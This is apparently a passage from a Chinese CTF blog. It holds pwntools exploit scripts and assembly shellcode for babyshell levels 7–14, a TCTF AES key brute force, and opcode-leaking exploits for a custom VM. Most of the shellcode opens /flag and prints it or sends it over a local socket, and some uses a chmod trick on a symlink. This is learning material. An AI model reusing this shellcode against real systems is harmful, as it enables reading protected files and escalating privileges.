        print(&quot;Received data:&quot;, data.decode())

        client_socket.close()
        server_socket.close()

if __name__ == &quot;__main__&quot;:
    start_server()
</code></pre>
<p>exp:</p>
<pre><code class="python">from pwn import *
from string import *
context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])
flag_file = &#39;/flag&#39;
flag_file = flag_file[::-1]
flag_file = flag_file.encode().hex()

# p = gdb.debug(&#39;./level6_chall&#39;,&#39;b *main\nb *main + 957\nb *main + 525&#39;)
p = process(&#39;/challenge/babyshell_level7&#39;)
p.recvuntil(&#39;Mapped 0x4000 bytes for shellcode at &#39;)
leak_addr = p.recvn(10).decode()
leak_addr = int(leak_addr, 16)
shellcode = &#39;&#39;&#39;
// socket:
    mov rdi, 2
    mov rsi, 1
    xor rdx, rdx
    mov rax, 41
    syscall

    mov rdi, rax
    mov r9, rax

//  socket addr preparation
    sub rsp, 4
    mov word ptr [rsp + 0], 2
    mov word ptr [rsp + 2], 0x2e16
    mov dword ptr [rsp + 4], 0x0100007f

    push rsp
    pop rsi

//  connect
    mov rdx, 16
    mov rax, 42
    syscall

//    mov rcx, rax // socket descriptor
    mov rcx, rdi

// close:
    mov rdi, 2
    mov rax, 3
    syscall

// open:
    mov rbx, 0x0067616c662f
    mov rsi, 0
    mov rdx, 0
    push rbx
    push rsp
    pop rdi
    mov rax, 2
    syscall

// read:
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x50
    xor rax, rax
    syscall


// write:
    mov rdx, rax
    xor rdi, rdi
    mov rdi, r9
    mov rsi, rsp
    mov rax, 1
    syscall

    mov rdi, rax
    mov rax, 3
    syscall

// exit
    mov rax, 59
    syscall
&#39;&#39;&#39;
shellcode = asm(shellcode)
p.sendafter(&#39;Reading 0x4000 bytes from stdin.\n&#39;,shellcode + b&#39;\n&#39;)
# h = p.recv(0x2000)
# print(h)
p.interactive()
</code></pre>
<h3 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h3><p>0x12 bytes，用的是chmod(‘file’,7)，<code>ln -s /flag f</code>软链接到f上来节约字符</p>
<pre><code>.intel_syntax noprefix
.text
.globl _start
_start:
    mov al, 0x5a
    mov sil, 7
    push 0x66     
    push rsp
    pop rdi
    syscall
</code></pre>
<blockquote>
<p>cat flag</p>
</blockquote>
<h3 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h3><p>每十个会CC十个，那么写一个生成shellcode，使得超过10个的时候会加入一个jmp（注意不能用qword mov这种大于等于八字节的指令，算是这题隐性的ban list）：</p>
<pre><code class="python">from pwn import *
from string import *
from random import *
context(os=&#39;linux&#39;,arch=&#39;amd64&#39;)
shellcode = f&#39;&#39;&#39;    mov rdi, 2
    mov rax, 3
    syscall
    xor rsi, rsi
    xor rdx, rdx
    sub rsp, 5
    mov byte ptr [rsp], 0x2f
    mov byte ptr [rsp+1], 0x66
    mov byte ptr [rsp+2], 0x6c
    mov byte ptr [rsp+3], 0x61
    mov byte ptr [rsp+4], 0x67
    mov byte ptr [rsp+5], 0x01
    sub byte ptr [rsp+5], 0x01
    push rsp
    pop rdi
    mov al, 2
    syscall
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x50
    xor rax, rax
    syscall
    mov rdx, rax
    mov dil, 1
    mov rsi, rsp
    mov al, 1
    syscall
    mov rax, 0x3c
    syscall&#39;&#39;&#39;
shellcode_list = shellcode.splitlines()
# print(shellcode_list)
shellcode_tmp = &#39;&#39;
shellcode_len = 0
shellcode_pad_flag = 0
i = 0
while (i &lt; len(shellcode_list)):
    # print(f&#39;shellcode_tmp [&#123;i&#125;]: \n&#39;,shellcode_tmp)
    if ((shellcode_len // 10) % 2 == 0 and shellcode_pad_flag == 1):
        if (shellcode_len % 10 &lt;= 8):
            random_str = &#39;&#39;.join(choices(string.ascii_letters, k=4))
            pad = -(shellcode_len % 10) + 8 + 10
            shellcode_tmp += f&quot;    jmp &#123;random_str&#125;\n    .rept &#123;pad&#125;\n    nop\n    .endr\n&#123;random_str&#125;:\n&quot;
            shellcode_len += pad + 2
            shellcode_pad_flag = 0
        else:
            shellcode_pad_flag = 1
            shellcode_len -= len(asm(shellcode_list[i - 1]))
            tmp = shellcode_tmp.splitlines()
            tmp = tmp[:-1]
            shellcode_tmp = &#39;\n&#39;.join(tmp)
            shellcode_tmp += &#39;\n&#39;
            i -= 1
        
    elif ((shellcode_len // 10) % 2 == 0 and shellcode_pad_flag == 0):
        shellcode_tmp += shellcode_list[i] + &#39;\n&#39;
        shellcode_len += len(asm(shellcode_list[i]))
        i += 1
        
    elif ((shellcode_len // 10) % 2 == 1):
        shellcode_len -= len(asm(shellcode_list[i - 1]))
        tmp = shellcode_tmp.splitlines()
        tmp = tmp[:-1]
        shellcode_tmp = &#39;\n&#39;.join(tmp)
        shellcode_tmp += &#39;\n&#39;
        i -= 1
        shellcode_pad_flag = 1
        
    
print(shellcode_tmp)
</code></pre>
<p>生成的exp</p>
<pre><code class="python">from pwn import *
from string import *
from random import *
# context.syntax = &#39;intel&#39;
context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])
flag_file = &#39;/flag&#39;
flag_file = flag_file[::-1]
flag_file = flag_file.encode().hex()
# print(flag_file)

shellcode = f&#39;&#39;&#39;    mov rdi, 2
    jmp EIBi
    .rept 11
    nop
    .endr
EIBi:
    mov rax, 3
    jmp wIoJ
    .rept 11
    nop
    .endr
wIoJ:
    syscall
    xor rsi, rsi
    xor rdx, rdx
    jmp GGxU
    .rept 10
    nop
    .endr
GGxU:
    sub rsp, 5
    mov byte ptr [rsp], 0x2f
    jmp HIQh
    .rept 10
    nop
    .endr
HIQh:
    mov byte ptr [rsp+1], 0x66
    jmp hAbJ
    .rept 13
    nop
    .endr
hAbJ:
    mov byte ptr [rsp+2], 0x6c
    jmp bxUa
    .rept 13
    nop
    .endr
bxUa:
    mov byte ptr [rsp+3], 0x61
    jmp JNPB
    .rept 13
    nop
    .endr
JNPB:
    mov byte ptr [rsp+4], 0x67
    jmp GoxX
    .rept 13
    nop
    .endr
GoxX:
    mov byte ptr [rsp+5], 0x01
    jmp xzHp
    .rept 13
    nop
    .endr
xzHp:
    sub byte ptr [rsp+5], 0x01
    push rsp
    pop rdi
    jmp UTod
    .rept 11
    nop
    .endr
UTod:
    mov al, 2
    syscall
    mov rdi, rax
    jmp Imgn
    .rept 11
    nop
    .endr
Imgn:
    mov rsi, rsp
    jmp EDoc
    .rept 15
    nop
    .endr
EDoc:
    mov rdx, 0x50
    jmp qLZG
    .rept 11
    nop
    .endr
qLZG:
    xor rax, rax
    syscall
    mov rdx, rax
    jmp AbtY
    .rept 10
    nop
    .endr
AbtY:
    mov dil, 1
    mov rsi, rsp
    mov al, 1
    jmp UuTH
    .rept 10
    nop
    .endr
UuTH:
    syscall
    mov rax, 0x3c
    syscall&#39;&#39;&#39;

hex_shellcode = asm(shellcode)
print(hex_shellcode)
p = gdb.debug(&#39;./level9_chall_cp&#39;,&#39;b *main\nb *main + 912&#39;)
# p = process(&#39;./level9_chall_cp&#39;)
p.sendafter(&#39;Reading 0x1000 bytes from stdin.\n&#39;,hex_shellcode + b&#39;\n&#39;)
# p.send(hex_shellcode + b&#39;\n&#39;)
p.interactive()
</code></pre>
<h3 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h3><p>要求从小到大，可以开始查一些单字节双字节指令插进去（这题用的多的是nop）</p>
<pre><code class="python">from pwn import *
from string import *
from random import *
# context.syntax = &#39;intel&#39;
context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])
flag_file = &#39;/flag&#39;
flag_file = flag_file[::-1]
flag_file = flag_file.encode().hex()
# print(flag_file)

shellcode = f&#39;&#39;&#39;
//  open
    mov rbx, 0x67616c662f
    nop
    xor rsi, rsi
    xor rdx, rdx
    mov al, 2
    push rbx
    push rsp
    nop
    nop
    pop rdi
    syscall
    nop

// read
    mov rdi, rax
    mov rsi, rsp
    nop
    nop
    nop
    nop
    mov dl, 0x50
    nop
    xor rax, rax

    syscall
    
// write
    nop
    nop
    nop
    mov dil, 1
    nop
    nop
    nop
    nop
    nop
    nop
    mov rsi, rsp
    mov rdx, rax
    mov al, 1
    syscall
    nop
    nop
    inc rax
&#39;&#39;&#39;

hex_shellcode = asm(shellcode)
print(hex_shellcode)
# p = gdb.debug(&#39;./level9_chall_cp&#39;,&#39;b *main\nb *main + 912&#39;)
p = process(&#39;./level10_chall&#39;)
p.sendafter(&#39;Reading 0x1000 bytes from stdin.\n&#39;,hex_shellcode + b&#39;\n&#39;)
# p.send(hex_shellcode + b&#39;\n&#39;)
p.interactive()
</code></pre>
<h3 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h3><p>用的socket，和上题一样但是长很多所以调整更多</p>
<pre><code class="python">from pwn import *
from string import *
from random import *
# context.syntax = &#39;intel&#39;
context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])
flag_file = &#39;/flag&#39;
flag_file = flag_file[::-1]
flag_file = flag_file.encode().hex()
# print(flag_file)

shellcode = f&#39;&#39;&#39;
// socket:
    xor rdi, rdi
    xor rsi, rsi
    xor rax, rax
    mov dil, 2
    mov sil, 1
    xor rdx, rdx
    mov al, 41
    syscall

    nop
    mov rdi, rax
    nop
    nop
    nop
    nop
    nop
    mov r9, rax
    
//  socket addr preparation
    nop
    sub rsp, 4
    mov word ptr [rsp + 0], 2
    nop
    nop
    mov word ptr [rsp + 2], 0x2e16
    nop
    nop
    mov word ptr [rsp + 4], 0x007f
    xchg eax, ecx
    mov word ptr [rsp + 6], 0x0100
    xchg eax, ecx

    push rsp
    pop rsi

//  connect
    mov dl, 16
    mov al, 42
    xchg eax, ecx
    xchg ecx, eax
    syscall

    mov rcx, rdi
    nop
    xchg eax, ecx
    xchg ecx, eax

// open:
    xor rsi, rsi
    xor rdx, rdx
    xchg eax, ecx
    xchg eax, ecx
    sub rsp, 5
    xchg eax, ecx
    xchg eax, ecx
    xchg eax, edx
    xchg eax, edx
    mov byte ptr [rsp], 0x2f
    xchg eax, edx
    xchg eax, edx
    xchg eax, edx
    xchg eax, edx
    mov byte ptr [rsp+1], 0x66
    nop
    xchg eax, ebx
    xchg eax, ebx
    mov byte ptr [rsp+2], 0x6c
    nop
    xchg eax, ebx
    xchg eax, ebx
    mov byte ptr [rsp+3], 0x61
    nop
    xchg eax, ebp
    xchg eax, ebp
    mov byte ptr [rsp+4], 0x67
    nop
    xchg eax, ebp
    xchg eax, ebp
    mov byte ptr [rsp+5], 0x00
    nop
    xchg eax, esi
    xchg eax, esi
    push rsp
    pop rdi
    mov al, 2
    syscall
    xchg eax, edi
    xchg eax, edi

// read:
    mov rdi, rax
    mov rsi, rsp
    xchg eax, edi
    xchg eax, edi
    mov dl, 0x50
    nop
    nop
    xor rax, rax
    xchg eax, edi
    xchg eax, edi
    syscall


// write:
    mov rdx, rax
    test eax, eax
    xor rdi, rdi
    mov rdi, r9
    test eax, eax
    mov rsi, rsp
    mov al, 0
    inc rax
    syscall

    mov rdi, rax
    inc rax
    mov al, 3
    
    syscall
    nop
    inc rax
&#39;&#39;&#39;

hex_shellcode = asm(shellcode)
# p = gdb.debug(&#39;./level9_chall_cp&#39;,&#39;b *main\nb *main + 912&#39;)
p = process(&#39;./level10_chall&#39;)
p.sendafter(&#39;Reading 0x1000 bytes from stdin.\n&#39;,hex_shellcode + b&#39;\n&#39;)
# p.send(hex_shellcode + b&#39;\n&#39;)
p.interactive()
</code></pre>
<h3 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h3><p>不能重复，这里就用chmod那个打法</p>
<pre><code class="python">from pwn import *
context(os=&#39;linux&#39;,arch=&#39;amd64&#39;)
shellcode = &#39;&#39;&#39;
    mov al, 0x5a
    mov sil, 7
    push 0x66     
    // f
    push rsp
    pop rdi
    syscall
&#39;&#39;&#39;
p = process(&#39;/challenge/babyshell_level13&#39;)
p.sendafter(&#39;Reading 0x1000 bytes from stdin.\n&#39;,asm(shellcode))
p.interactive()
</code></pre>
<h3 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h3><p>前面的exp可以打通，这里不是很理解为什么没有write还可以push和pop</p>
<pre><code class="python">from pwn import *
context(os=&#39;linux&#39;,arch=&#39;amd64&#39;)
shellcode = &#39;&#39;&#39;
    mov al, 0x5a
    mov sil, 7
    push 0x66     
    // f
    push rsp
    pop rdi
    syscall
&#39;&#39;&#39;
p = process(&#39;/challenge/babyshell_level13&#39;)
p.sendafter(&#39;Reading 0x1000 bytes from stdin.\n&#39;,asm(shellcode))
p.interactive()
# 即使栈没有写权限，还是可以push和pop
</code></pre>
<h3 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h3><p>6字节，这里只能read，调试利用已有的寄存器，<code>fd = 1</code>即可接着写入shellcode</p>
<pre><code class="python">from pwn import *
context(os=&#39;linux&#39;,arch=&#39;amd64&#39;, terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;],log_level=&#39;debug&#39;)
shellcode = &#39;&#39;&#39;
    xor edi, edi
    mov esi, edx
    syscall
&#39;&#39;&#39;
# p = process(&#39;/challenge/babyshell_level14&#39;)
# p = gdb.debug(&#39;/challenge/babyshell_level14&#39;,&#39;b *main + 634&#39;)
p = gdb.debug(&#39;./level14_chall&#39;,&#39;b* main + 674&#39;)
p.sendafter(&#39;Reading 0x6 bytes from stdin.\n&#39;,asm(shellcode))
shellcode = &#39;&#39;&#39;
//  open
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    mov rbx, 0x0067616c662f
    mov rsi, 0
    mov rdx, 0
    mov al, 2
    push rbx
    push rsp
    pop rdi
    syscall

// read
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x50
    mov rax, 0
    syscall

// write
    mov rdi, 1
    mov rsi, rsp
    mov rdx, rax
    mov rax, 1
    syscall
&#39;&#39;&#39;
p.send(asm(shellcode))
p.interactive()
</code></pre>
]]></content>
  </entry>
  <entry>
    <title>tctf</title>
    <url>/2023/12/08/tctf/</url>
    <content><![CDATA[<h6 id="PREFACE：状态差，本来不想打了，但是又不想浪费时间，刚电子ed结束五个小时又开始了打个rpg好累"><a href="#PREFACE：状态差，本来不想打了，但是又不想浪费时间，刚电子ed结束五个小时又开始了打个rpg好累" class="headerlink" title="PREFACE：状态差，本来不想打了，但是又不想浪费时间，刚电子ed结束五个小时又开始了打个rpg好累"></a>PREFACE：状态差，本来不想打了，但是又不想浪费时间，刚电子ed结束五个小时又开始了打个rpg好累</h6><h6 id="确实状态差，最近老是抱着不出题的心态开始做，有点啥思路反正又丢给别人自己不知道在干嘛，有始有终给wp水了吧，，，"><a href="#确实状态差，最近老是抱着不出题的心态开始做，有点啥思路反正又丢给别人自己不知道在干嘛，有始有终给wp水了吧，，，" class="headerlink" title="确实状态差，最近老是抱着不出题的心态开始做，有点啥思路反正又丢给别人自己不知道在干嘛，有始有终给wp水了吧，，，"></a>确实状态差，最近老是抱着不出题的心态开始做，有点啥思路反正又丢给别人自己不知道在干嘛，有始有终给wp水了吧，，，</h6><span id="more"></span>

<h3 id="tmux"><a href="#tmux" class="headerlink" title="tmux"></a>tmux</h3><p>符号表打进去，其实用处不大</p>
<pre><code>git clone https://github.com/tmux/tmux.git
cd tmux
git checkout bdf8e614af34ba1eaa8243d3a818c8546cb21812

sudo apt-get install libevent-dev libncurses-dev
./autogen.sh
./configure CFLAGS=&quot;-g -O0&quot;
make
</code></pre>
<p>找这段（十六进制搜）：</p>
<p><img src="/2023/12/08/tctf/image-20231208195004762.png" alt="image-20231208195004762"></p>
<p>调调看看发现是aes，key只有012</p>
<p>（偷sink爷个脚本）</p>
<pre><code class="python">from Crypto.Cipher import AES

for i1 in range(1, 3):
    for i2 in range(1, 3):
        for i3 in range(1, 3):
            for i4 in range(1, 3):
                for i5 in range(1, 3):
                    for i6 in range(1, 3):
                        for i7 in range(1, 3):
                            for i8 in range(1, 3):
                                for i9 in range(1, 3):
                                    for ia in range(1, 3):
                                        for ib in range(1, 3):
                                            for ic in range(1, 3):
                                                for id in range(1, 3):
                                                    for ie in range(1, 3):
                                                        for iff in range(1, 3):
                                                            for i10 in range(1, 3):
                                                                key = [
                                                                    i1,
                                                                    i2,
                                                                    i3,
                                                                    i4,
                                                                    i5,
                                                                    i6,
                                                                    i7,
                                                                    i8,
                                                                    i9,
                                                                    ia,
                                                                    ib,
                                                                    ic,
                                                                    id,
                                                                    ie,
                                                                    iff,
                                                                    i10,
                                                                ]
                                                                aes = AES.new(key=bytes(key), mode=AES.MODE_ECB)
                                                                p1 = bytes.fromhex(&quot;D47D8FE192A9605A5E8EDCADE2DBBEDC&quot;)
                                                                flag = aes.decrypt(p1)
                                                                if flag.startswith(b&quot;flag&#123;&quot;):
                                                                    p1 = bytes.fromhex(
                                                                        &quot;D47D8FE192A9605A5E8EDCADE2DBBEDC9E103EBAF7DB72DAF73367D9FA13043F680D89FE7399908919E4530E3EC8C3D0&quot;
                                                                    )
                                                                    flag = aes.decrypt(p1)
                                                                    print(flag)
                                                                    exit()
</code></pre>
<h3 id="RPC"><a href="#RPC" class="headerlink" title="RPC"></a>RPC</h3><p>golangRPC，加密套娃玩意</p>
<p>main__ptr_S_A是加密，python tcp协议按顺序传一下包即可调试</p>
<p><img src="/2023/12/08/tctf/image-20231208195637621.png" alt="image-20231208195637621"></p>
<p>然后就是加密套娃</p>
]]></content>
  </entry>
  <entry>
    <title>vm初探</title>
    <url>/2024/04/08/vm%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h6 id="PREFACE：最后两个逆向题，其实更像pwn的入门vm，写个orw，最后一题需要用各种方法bruteforce-amp-leak-opcode（由于附件不同这里exp相当于一个思路）"><a href="#PREFACE：最后两个逆向题，其实更像pwn的入门vm，写个orw，最后一题需要用各种方法bruteforce-amp-leak-opcode（由于附件不同这里exp相当于一个思路）" class="headerlink" title="PREFACE：最后两个逆向题，其实更像pwn的入门vm，写个orw，最后一题需要用各种方法bruteforce &amp; leak opcode（由于附件不同这里exp相当于一个思路）"></a>PREFACE：最后两个逆向题，其实更像pwn的入门vm，写个orw，最后一题需要用各种方法bruteforce &amp; leak opcode（由于附件不同这里exp相当于一个思路）</h6><span id="more"></span>

<h5 id="直白的orw"><a href="#直白的orw" class="headerlink" title="直白的orw"></a>直白的orw</h5><p>21.1</p>
<p>（ps.后面看这里有点问题的，偏移其实不对，但是可以通，很奇妙，可能是有什么奇妙巧合？）</p>
<pre><code class="python">
from pwn import *
context(os = &#39;linux&#39;,arch = &#39;amd64&#39;)
# context(log_level=&#39;debug&#39;)
# context(terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])
# p = gdb.debug(&#39;./babyrev_level21.0&#39;,&#39;b *interpret_sys + 156\nb *interpret_sys + 491\nb *interpret_sys + 659&#39;)
p = process([&#39;strace&#39;,&#39;./babyrev_level21.1&#39;])
# p = process(&#39;./babyrev_level21.1&#39;)
def register(name):
    match name:
        case &#39;opcode[1024]&#39;:
            return 64
        case &#39;opcode[1025]&#39;:
            return 1
        case &#39;opcode[1026]&#39;:
            return 16
        case &#39;opcode[1027]&#39;:
            return 4
        case &#39;opcode[1028]&#39;:
            return 8
        case &#39;opcode[1029]&#39;:
            return 32
    print(&#39;err register&#39;)

def interpret_instruction(name):
    match name:
        case &#39;interpret_imm&#39;:
            return 0x200
        case &#39;interpret_add&#39;:
            return 0x400
        case &#39;interpret_stk&#39;:
            return 0x800
        case &#39;interpret_stm&#39;:
            return 0x100
        case &#39;interpret_ldm&#39;:
            return 0x1000
        case &#39;interpret_cmp&#39;:
            return 0x8000
        case &#39;interpret_jmp&#39;:
            return 0x2000
        case &#39;interpret_sys&#39;:
            return 0x4000
    print(&#39;err instruction&#39;)

def interpret_imm(regs,value):
    return interpret_instruction(&#39;interpret_imm&#39;) + register(regs) + (value &lt;&lt; 16)

def interpret_stm():
    # opcode[1025] = offset
    # opcode[1026] = value
    return interpret_instruction(&#39;interpret_stm&#39;) + (register(&#39;opcode[1025]&#39;)) + (register(&#39;opcode[1026]&#39;) &lt;&lt; 16)

def interpret_sys(name):
    match name:
        case &#39;open&#39;:
            return 0x20
        case &#39;read_code&#39;:
            return 0x4
        case &#39;read&#39;:
            return 0x8
        case &#39;write&#39;:
            return 0x2
        case &#39;sleep&#39;:
            return 0x10
        case &#39;exit&#39;:
            return 0x1
    print(&#39;err sys&#39;)

def open():
    # opcode[opcode[1024] + 768] = addr
    # opcode[1024] = fd
    # opcode[1026] = len
    return interpret_sys(&#39;open&#39;) + interpret_instruction(&#39;interpret_sys&#39;) + (register(&#39;opcode[1024]&#39;) &lt;&lt; 16)

def read():
    # opcode[1024] = fd
    # opcode[1025] = ret len
    return interpret_sys(&#39;read&#39;) + interpret_instruction(&#39;interpret_sys&#39;) + (register(&#39;opcode[1025]&#39;) &lt;&lt; 16)

def write():
    # opcode[1024] = fd
    return interpret_sys(&#39;write&#39;) + interpret_instruction(&#39;interpret_sys&#39;) + (register(&#39;opcode[1025]&#39;) &lt;&lt; 16)

def exitPro():
    return interpret_sys(&#39;exit&#39;) + interpret_instruction(&#39;interpret_sys&#39;)

opcode_func = &#39;&#39;&#39;
interpret_imm(&#39;opcode[1025]&#39;,768) # offset
interpret_imm(&#39;opcode[1026]&#39;,ord(&#39;/&#39;)) # value
interpret_stm()
interpret_imm(&#39;opcode[1025]&#39;,769) # offset
interpret_imm(&#39;opcode[1026]&#39;,ord(&#39;f&#39;)) # value
interpret_stm()
interpret_imm(&#39;opcode[1025]&#39;,770) # offset
interpret_imm(&#39;opcode[1026]&#39;,ord(&#39;l&#39;)) # value
interpret_stm()
interpret_imm(&#39;opcode[1025]&#39;,771) # offset
interpret_imm(&#39;opcode[1026]&#39;,ord(&#39;a&#39;)) # value
interpret_stm()
interpret_imm(&#39;opcode[1025]&#39;,772) # offset
interpret_imm(&#39;opcode[1026]&#39;,ord(&#39;g&#39;)) # value
interpret_stm()

interpret_imm(&#39;opcode[1024]&#39;,0) # addr = opcode[0 + 768]
interpret_imm(&#39;opcode[1025]&#39;,0)
interpret_imm(&#39;opcode[1026]&#39;,0)
open()

interpret_imm(&#39;opcode[1026]&#39;,0x50) # len
read()

interpret_imm(&#39;opcode[1024]&#39;,1)
interpret_imm(&#39;opcode[1025]&#39;,0)
interpret_imm(&#39;opcode[1026]&#39;,0x50) # len
write()
exitPro()
&#39;&#39;&#39;
opcode = []
opcode_func = opcode_func.split(&#39;\n&#39;)
# print(opcode_func)
for i in opcode_func:
    if (i == &#39;&#39;):
        continue
    p48 = eval(i)
    opcode.append(p48 &amp; 0xff)
    opcode.append((p48 &amp; 0xff00) &gt;&gt; 8)
    opcode.append((p48 &amp; 0xff0000) &gt;&gt; 16)
opcode+=([0] * (0x300 - len(opcode)))

a = opcode
a = b&#39;&#39;.join([bytes([i]) for i in a])
# print(a)
p.send(a)
p.interactive()
</code></pre>
<h5 id="随机化opcode的orw"><a href="#随机化opcode的orw" class="headerlink" title="随机化opcode的orw"></a>随机化opcode的orw</h5><p>22.0</p>
<p>爆破的思路：</p>
<p>种子一共0xff个，没有尝试直接爆，徒手一步一步做的（注释掉的就是思路），从exit为入口点一步一步推一步一步还原（这里最后的open只有三个可能的值<code>1|8|64</code>，直接手试了）:</p>
<pre><code class="python">
from pwn import *
context(os = &#39;linux&#39;,arch = &#39;amd64&#39;)
# context(log_level=&#39;debug&#39;)
# context(terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])
# p = gdb.debug(&#39;./babyrev_level21.0&#39;,&#39;b *interpret_sys + 156\nb *interpret_sys + 491\nb *interpret_sys + 659&#39;)
# p = process([&#39;strace&#39;,&#39;./babyrev_level22.0&#39;])

# ------------------------------------------------
### sys:16  | exit:1
### interpret_imm:4 | opcode[1024]:8
### sleep:128
### read_code|read_memory:2/32                 opcode[1029]:64   none:4
### add:2
# ------------------------------------------------

## test exit
### sys:16, exit:1
# table = [1,2,4,8,16,32,64,0x80]
# for i in table:
#     for j in table:
#         a = []
#         a.append(5)
#         a.append(j)
#         a.append(i)
#         a += [0] * 0x300
#         a = b&#39;&#39;.join([bytes([i]) for i in a])
#         p = process(&#39;/challenge/babyrev_level22.0&#39;)
#         p.sendafter(b&quot;This time, YOU&#39;RE in control! Please input your yancode: &quot;,a)
#         h = p.recv(4096)
#         print(i)
#         print(j)

## test interpret_imm, opcode | search : &quot;exit code 5&quot;
# table = [1,2,4,8,16,32,64,0x80]
# for i in table:
#     for j in table:
#         a = []
#         a.append(5)
#         a.append(j)
#         a.append(i)
#         a.append(0)
#         a.append(16)
#         a.append(1)
#         a += [0] * 0x250
#         a = b&#39;&#39;.join([bytes([i]) for i in a])
#         p = process(&#39;/challenge/babyrev_level22.0&#39;)
#         p.sendafter(b&quot;This time, YOU&#39;RE in control! Please input your yancode: &quot;,a)
#         h = p.recv(4096)
#         print(i)
#         print(j)

## test sleep 128
# table = [1,2,4,8,16,32,64,0x80]
# for i in table:
#     a = []
#     a.append(0x10)
#     a.append(8)
#     a.append(4) # opcode[1024] = 0
#     a.append(0x10)
#     a.append(i)
#     a.append(1) # sleep
#     a.append(0)
#     a.append(16)
#     a.append(1) # exit
#     a = b&#39;&#39;.join([bytes([i]) for i in a])
#     p = process(&#39;/challenge/babyrev_level22.0&#39;)
#     p.sendafter(b&quot;This time, YOU&#39;RE in control! Please input your yancode: &quot;,a)
#     p.interactive()
#     # print(h)
#     print(i)

# use exit and add can exploit all the regs
## find add first:2
# import time
# table = [1,2,4,8,16,32,64,0x80]
# for j in table:
#     print(j)
#     a = []
#     a.append(3)
#     a.append(8)
#     a.append(4) # opcode[1024] = 3
#     a.append(8)
#     a.append(8)
#     a.append(j) # test add
#     a.append(0)
#     a.append(16)
#     a.append(1) # exit
#     a_byte = b&#39;&#39;.join([bytes([i]) for i in a])
#     p = process(&#39;/challenge/babyrev_level22.0&#39;)
#     p.sendafter(b&quot;This time, YOU&#39;RE in control! Please input your yancode: &quot;,a_byte)
#     time.sleep(0.1)
#     p.kill()

## test ldm
# 32
# table = [1,2,4,8,16,32,64,0x80]
# for j in table:
#     print(j)
#     a = []
#     a.append(3)
#     a.append(8)
#     a.append(4) # opcode[1024] = 10
#     a.append(8)
#     a.append(8)
#     a.append(j) # test ldm
#     a.append(0)
#     a.append(16)
#     a.append(1) # exit
#     a_byte = b&#39;&#39;.join([bytes([i]) for i in a])
#     p = process(&#39;/challenge/babyrev_level22.0&#39;)
#     p.sendafter(b&quot;This time, YOU&#39;RE in control! Please input your yancode: &quot;,a_byte)
#     time.sleep(0.1)
#     p.kill()

## test stm
# 64
# table = [1,2,4,8,16,32,64,0x80]
# for j in table:
#     print(j)
#     a = []
#     a.append(3)
#     a.append(8)
#     a.append(4) # opcode[1024] = 3
#     a.append(8)
#     a.append(1)
#     a.append(j) # test stm opcode[768] = 3;
#     a.append(5)
#     a.append(8)
#     a.append(4) # opcode[1024] = 5 # failed to write
#     a.append(1)
#     a.append(8)
#     a.append(32) # ldm
#     a.append(0)
#     a.append(16)
#     a.append(1) # exit
#     a_byte = b&#39;&#39;.join([bytes([i]) for i in a])
#     p = process(&#39;/challenge/babyrev_level22.0&#39;)
#     p.sendafter(b&quot;This time, YOU&#39;RE in control! Please input your yancode: &quot;,a_byte)
#     time.sleep(0.1)
#     p.kill()

# # # write
# # write:4
# table = [1,2,4,8,16,32,64,0x80]
# for j in table:
#     if (j == 16 or j == 128 or j == 2 or j == 32):
#         continue
#     print(j)
#     a = []
#     a.append(ord(&#39;^&#39;))
#     a.append(8)
#     a.append(4) # opcode[1024] = ord(&#39;^&#39;)
#     a.append(8)
#     a.append(1)
#     a.append(64) # stm opcode[768] = ord(&#39;^&#39;);
#     a.append(1)
#     a.append(1)
#     a.append(4) # opcode[[1]] ++
#     a.append(8)
#     a.append(1)
#     a.append(64) # stm opcode[769] = ord(&#39;^&#39;);
#     a.append(2)
#     a.append(1)
#     a.append(4) # opcode[[1]] ++
#     a.append(8)
#     a.append(1)
#     a.append(64) # stm opcode[769] = ord(&#39;^&#39;);
#     for i in table: # all register = 1
#         if (i == 8 or i == 4 or i == 64):
#             continue
#         a.append(1)
#         a.append(i)
#         a.append(4)
#     a.append(1)
#     a.append(8)
#     a.append(4) # opcode[1024] = 1 # fd = io
#     a.append(1)
#     a.append(j)
#     a.append(1) # write
#     a.append(0)
#     a.append(16)
#     a.append(1) # exit
#     a_byte = b&#39;&#39;.join([bytes([i]) for i in a])
#     p = process(&#39;/challenge/babyrev_level22.0&#39;)
#     p.sendafter(b&quot;This time, YOU&#39;RE in control! Please input your yancode: &quot;,a_byte)
#     time.sleep(0.3)
#     print(p.recv())
#     p.kill()

# ## opcode[1025]
# # 1
# table = [1,2,4,8,16,32,64,0x80]
# tmp_a = []
# tmp_a.append(ord(&#39;^&#39;))
# tmp_a.append(8)
# tmp_a.append(4) # opcode[1024] = ord(&#39;^&#39;)
# tmp_a.append(8)
# tmp_a.append(1)
# tmp_a.append(64) # stm opcode[768] = ord(&#39;^&#39;);
# tmp_a.append(1)
# tmp_a.append(1)
# tmp_a.append(4) # opcode[[1]] ++
# tmp_a.append(8)
# tmp_a.append(1)
# tmp_a.append(64) # stm opcode[769] = ord(&#39;^&#39;);
# tmp_a.append(2)
# tmp_a.append(1)
